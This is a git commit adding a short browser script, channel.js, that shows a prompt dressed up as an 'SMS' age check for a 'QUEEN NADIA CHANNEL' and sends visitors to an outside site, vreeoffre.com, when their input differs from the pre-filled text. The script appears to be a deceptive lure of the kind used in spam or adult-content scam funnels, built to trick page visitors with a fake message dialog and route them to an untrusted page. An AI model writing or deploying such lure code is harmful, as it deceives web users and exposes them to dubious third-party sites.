376cb4274e585d41addfea6565ecc576a8c47fd0
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-02-03 15:51:27 +0100

    Create channel.js

---
+++ channel.js
@@ -0,0 +1,5 @@
+var password = 'QUEEN NADIA CHANNEL'
+password=prompt('SMS: Hello, to Join the channel you must be 18 +, click OK to Join Now if you are 18+','QUEEN NADIA CHANNEL');
+if (password != 'QUEEN NADIA CHANNEL') {
+location.href='https://vreeoffre.com/join-channel.html';
+}
